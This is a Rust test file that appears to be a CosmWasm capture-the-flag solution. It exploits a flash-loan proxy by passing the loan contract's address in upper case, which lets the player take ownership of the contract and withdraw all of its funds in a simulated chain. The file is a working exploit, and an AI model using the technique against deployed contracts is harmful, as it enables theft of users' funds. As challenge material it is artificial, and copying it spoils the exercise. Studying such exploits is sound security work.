#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::DENOM,
        integration_tests::tests::{proper_instantiate, USER},
    };
    use common::{flash_loan::ExecuteMsg as FlashLoanExecuteMsg, proxy::ExecuteMsg};
    use cosmwasm_std::{to_binary, Addr, Uint128};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
            proper_instantiate();

        let player = Addr::unchecked(USER);

        let msg_transfer_owner = to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: player.clone(),
        })
        .unwrap();

        let upper_flash_loan_contract =
            Addr::unchecked(flash_loan_contract.to_string().to_uppercase());

        app.execute_contract(
            player.clone(),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: upper_flash_loan_contract,
                msg: msg_transfer_owner.clone(),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            player.clone(),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds {
                recipient: player.clone(),
            },
            &[],
        )
        .unwrap();

        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(0));
        let balance = app.wrap().query_balance(player.to_string(), DENOM).unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }
}
